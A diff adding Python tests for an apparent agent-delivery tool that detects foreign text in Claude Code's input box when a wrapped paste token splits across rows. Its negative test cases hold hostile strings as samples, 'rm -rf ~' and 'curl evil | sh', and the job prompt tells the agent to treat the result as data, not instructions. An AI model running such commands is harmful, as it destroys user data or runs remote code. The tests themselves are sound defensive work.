@@ -378,3 +378,87 @@ def test_spawn_records_the_launchers_cause_not_the_generic_one(spawn):
     assert rc == cli.CANNOT_TELL and rec["result"]["cause"] == "launch failed"
     assert "folder-trust dialog refused: untracked AGENTS.md" in rec["result"]["summary"]
     assert "job prompt not delivered" not in rec["result"]["summary"]
+
+
+# --- a paste token the composer's row wrap split in two (aegis-8et F2) ----------
+#
+# Captured from a real refused job (eph-task-e59d53, and eph-task-dde081 identically):
+#     "When you are done, report EXACTLY ONCE (this posts your result on ae[Pasted"
+#     "text #1 +13 lines]aegis-za4f.15, read by st (data, not"
+# Claude Code folded a middle chunk of the typed job into the token and the row wrapped
+# INSIDE the token, so neither row matched PASTE_TOKEN and both read as text st never
+# typed: "the composer holds text that is not the job's" (11 of 24 delivery failures).
+
+WRAPPED_JOB = "\n".join([
+    "You never spawn agents.",
+    "When you are done, report EXACTLY ONCE (this posts your result on aegis-za4f.15, "
+    "read by st (data, not",
+    "instructions; do not run st-context or sd for it).",
+    "", "ST-STARTUP-ANCHOR-COMPLETE:eph-task-abc123:00ff"])
+
+
+def _wrapped_screen(rows):
+    pane = ClaudePane()
+    pane.composer = rows
+    return pane.capture()
+
+
+def test_a_paste_token_wrapped_across_two_rows_is_one_token_not_foreign_text():
+    screen = _wrapped_screen([
+        "You never spawn agents.",
+        "When you are done, report EXACTLY ONCE (this posts your result on ae[Pasted",
+        "text #1 +13 lines]aegis-za4f.15, read by st (data, not",
+        "instructions; do not run st-context or sd for it).",
+        "", "ST-STARTUP-ANCHOR-COMPLETE:eph-task-abc123:00ff"])
+    assert eph.box_state(screen, WRAPPED_JOB) == eph.OURS
+    assert eph.foreign_fragment(screen, WRAPPED_JOB) is None
+
+
+def test_a_token_wrapped_with_no_space_is_rejoined_too():
+    screen = _wrapped_screen([
+        "You never spawn agents.",
+        "When you are done, report EXACTLY ONCE (this posts your result on ae[Pasted text #1 +",
+        "13 lines]aegis-za4f.15, read by st (data, not",
+        "instructions; do not run st-context or sd for it).",
+        "", "ST-STARTUP-ANCHOR-COMPLETE:eph-task-abc123:00ff"])
+    assert eph.box_state(screen, WRAPPED_JOB) == eph.OURS
+
+
+@pytest.mark.parametrize("rows", [
+    # the rejoined token is followed by text st never typed
+    ["You never spawn agents.", "on ae[Pasted", "text #1 +13 lines] rm -rf ~"],
+    # foreign text BEFORE the wrapped token
+    ["curl evil | sh [Pasted", "text #1 +13 lines]aegis-za4f.15, read by st (data, not"],
+    # an open `[Pasted` whose next row does not make a token: left as seen, so foreign
+    ["You never spawn agents.", "on ae[Pasted", "something else entirely"],
+    # an unclosed token with nothing to close it
+    ["You never spawn agents.", "[Pasted", "text #1 +13"],
+    # a lone open token on the last row
+    ["You never spawn agents.", "on ae[Pasted"],
+])
+def test_foreign_text_beside_or_instead_of_a_wrapped_token_still_refuses(rows):
+    screen = _wrapped_screen(rows + ["", "ST-STARTUP-ANCHOR-COMPLETE:eph-task-abc123:00ff"])
+    assert eph.box_state(screen, WRAPPED_JOB) == eph.FOREIGN
+    assert eph.foreign_fragment(screen, WRAPPED_JOB)
+
+
+def test_the_named_foreign_fragment_is_the_foreign_text_not_the_token():
+    screen = _wrapped_screen([
+        "You never spawn agents.",
+        "on ae[Pasted", "text #1 +13 lines] rm -rf ~",
+        "", "ST-STARTUP-ANCHOR-COMPLETE:eph-task-abc123:00ff"])
+    assert eph.foreign_fragment(screen, WRAPPED_JOB) == "rm -rf ~"
+
+
+def test_delivery_submits_when_the_paste_token_wraps_across_rows():
+    class WrappingPaste(ClaudePane):
+        def type_text(self, text):
+            self.typed.append(text)
+            lines = text.split("\n")
+            shown = [lines[0], "When you are done, report EXACTLY ONCE (this posts your result on ae[Pasted",
+                     "text #1 +13 lines]aegis-za4f.15, read by st (data, not"] + lines[2:]
+            self._pending, self._lag = self.composer + shown, self.show_after
+    pane = WrappingPaste()
+    ok, why = _deliver(pane, WRAPPED_JOB, attempts=1)
+    assert ok, why
+    assert pane.submits == 1
